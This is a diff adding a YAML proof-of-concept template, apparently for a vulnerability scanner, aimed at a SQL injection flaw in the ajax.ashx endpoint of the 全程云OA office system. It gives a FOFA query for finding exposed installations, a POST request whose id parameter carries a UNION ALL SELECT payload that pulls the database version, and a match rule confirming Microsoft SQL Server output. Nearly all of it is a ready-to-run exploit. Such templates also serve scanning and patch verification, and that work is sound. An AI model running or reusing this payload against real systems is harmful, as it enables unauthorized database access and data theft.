@@ -1,0 +1,19 @@
+id: poc-yaml-quan-cheng-yun-ajax-ashx-sqli
+info:
+  name: 全程云OA ajax.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全程云OA
+  fofa: body="全程云OA" || body="images/yipeoplehover.png"
+requests:
+- method: POST
+  path: /OA/common/mod/ajax.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1
+    UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
+  expression: status_code == 200 && contains(body,"ProductColumn") && contains(body,"Microsoft
+    SQL Server") && !contains(body,"<p")
+variables: {}
+transport: http
